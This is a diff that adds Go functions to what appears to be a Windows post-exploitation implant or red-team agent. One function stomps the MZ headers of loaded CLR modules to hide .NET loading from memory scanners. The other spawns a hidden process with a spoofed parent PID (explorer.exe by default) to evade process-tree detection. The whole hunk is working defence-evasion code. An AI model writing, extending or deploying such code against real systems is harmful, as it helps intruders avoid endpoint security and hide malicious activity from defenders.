@@ -955,3 +955,107 @@ func netSharesJSON(host string) (string, error) {
 	}
 	return string(data), nil
 }
+
+// ── CLR_STOMP ─────────────────────────────────────────────────────────────────
+
+// clrStomp zeroes the MZ header of every loaded CLR/mscor module in-process.
+// Returns a message with the count of modules stomped.
+func clrStomp() string {
+	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, 0)
+	if err != nil {
+		return "[-] CreateToolhelp32Snapshot: " + err.Error()
+	}
+	defer windows.CloseHandle(snap)
+
+	var me windows.ModuleEntry32
+	me.Size = uint32(unsafe.Sizeof(me))
+	stomped := 0
+
+	for windows.Module32First(snap, &me) == nil {
+		name := strings.ToLower(windows.UTF16ToString(me.Module[:]))
+		if strings.Contains(name, "clr") || strings.Contains(name, "mscor") {
+			base := (*byte)(unsafe.Pointer(me.ModBaseAddr))
+			if base != nil && *base == 0x4D { // 'M'
+				var old uint32
+				apiVirtualProtect(me.ModBaseAddr, 2, windows.PAGE_READWRITE, uintptr(unsafe.Pointer(&old)))
+				*base = 0
+				*(*byte)(unsafe.Pointer(me.ModBaseAddr + 1)) = 0
+				apiVirtualProtect(me.ModBaseAddr, 2, uintptr(old), uintptr(unsafe.Pointer(&old)))
+				stomped++
+			}
+		}
+		if windows.Module32Next(snap, &me) != nil {
+			break
+		}
+	}
+	return fmt.Sprintf("[+] stomped %d CLR module header(s)", stomped)
+}
+
+// ── PPID spoof (spawn with custom parent) ────────────────────────────────────
+
+// spawnWithPPID spawns cmd with its Win32 PPID set to the first process
+// matching parent (default: explorer.exe). Returns a status string.
+func spawnWithPPID(cmd, parent string) string {
+	if parent == "" {
+		parent = "explorer.exe"
+	}
+	if cmd == "" {
+		cmd = "cmd.exe"
+	}
+	parentPID := findProcessByName(parent)
+	if parentPID == 0 {
+		return fmt.Sprintf("[-] parent process '%s' not found", parent)
+	}
+	parentH, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, parentPID)
+	if err != nil {
+		return fmt.Sprintf("[-] OpenProcess(%s): %v", parent, err)
+	}
+	defer windows.CloseHandle(parentH)
+
+	var attrListSize uintptr
+	procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
+	attrList := make([]byte, attrListSize)
+	r, _, _ := procInitializeProcThreadAttributeList.Call(
+		uintptr(unsafe.Pointer(&attrList[0])), 1, 0,
+		uintptr(unsafe.Pointer(&attrListSize)),
+	)
+	if r == 0 {
+		return "[-] InitializeProcThreadAttributeList failed"
+	}
+	defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))
+
+	r, _, _ = procUpdateProcThreadAttribute.Call(
+		uintptr(unsafe.Pointer(&attrList[0])), 0,
+		uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+		uintptr(unsafe.Pointer(&parentH)),
+		unsafe.Sizeof(parentH), 0, 0,
+	)
+	if r == 0 {
+		return "[-] UpdateProcThreadAttribute failed"
+	}
+
+	type startupInfoEx struct {
+		si      windows.StartupInfo
+		attrPtr uintptr
+	}
+	siEx := startupInfoEx{}
+	siEx.si.Cb = uint32(unsafe.Sizeof(siEx))
+	siEx.si.Flags = windows.STARTF_USESHOWWINDOW
+	siEx.si.ShowWindow = 0
+	siEx.attrPtr = uintptr(unsafe.Pointer(&attrList[0]))
+
+	var pi windows.ProcessInformation
+	cmdW, _ := windows.UTF16PtrFromString(cmd)
+	const EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+	err = windows.CreateProcess(
+		nil, cmdW, nil, nil, false,
+		windows.CREATE_NEW_CONSOLE|EXTENDED_STARTUPINFO_PRESENT,
+		nil, nil, &siEx.si, &pi,
+	)
+	if err != nil {
+		return fmt.Sprintf("[-] CreateProcess: %v", err)
+	}
+	windows.CloseHandle(pi.Thread)
+	windows.CloseHandle(pi.Process)
+	return fmt.Sprintf("[+] spawned '%s' (PID %d) with PPID=%s", cmd, pi.ProcessId, parent)
+}
